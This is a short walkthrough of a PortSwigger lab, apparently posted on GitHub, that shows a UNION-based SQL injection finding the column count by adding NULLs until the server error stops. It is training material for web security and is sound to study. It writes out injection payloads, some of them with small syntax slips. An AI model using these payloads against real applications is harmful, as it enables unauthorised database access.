## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/31f08675-5378-41b6-ada5-ef1cffbf978b)

## Solution :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/aaf3ff13-c33e-4af9-b39d-4acdd565dcb8)

Query made - 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

Added "UNION NULL" to the request to determine the number of columns used in the query.

```SQL
SELECT * FROM someTable WHERE category = '<CATEGORY>''UNION+SELECT+NULL--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/088aa7ca-c084-4a95-9a53-828558f2d185)

we got internal server error so the coloms size is more than 1.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/73e405f2-d178-491e-87c9-8b2d6f07c3ee)

Incrementing 'NULL' once again .

```SQL
SELECT * FROM someTable WHERE category = '<CATEGORY>''UNION+SELECT+NULL,NULL--
```
![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/b8e97441-aac7-4f9c-9b40-02cd6a625930)

we got internal server error again so the coloms size is more than 2.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/73e405f2-d178-491e-87c9-8b2d6f07c3ee)

Incrementing 'NULL' 3rd time.

```SQL
SELECT * FROM someTable WHERE category = '<CATEGORY>''UNION+SELECT+NULL,NULL+NULL--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/187445d5-5c5b-482b-a626-7af3bb8f74d6)

This did not throws an internal server error. It means that there are 3 columns that is being retreived in the query.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d57e1089-4892-402a-9e5a-509cfc10fab2)





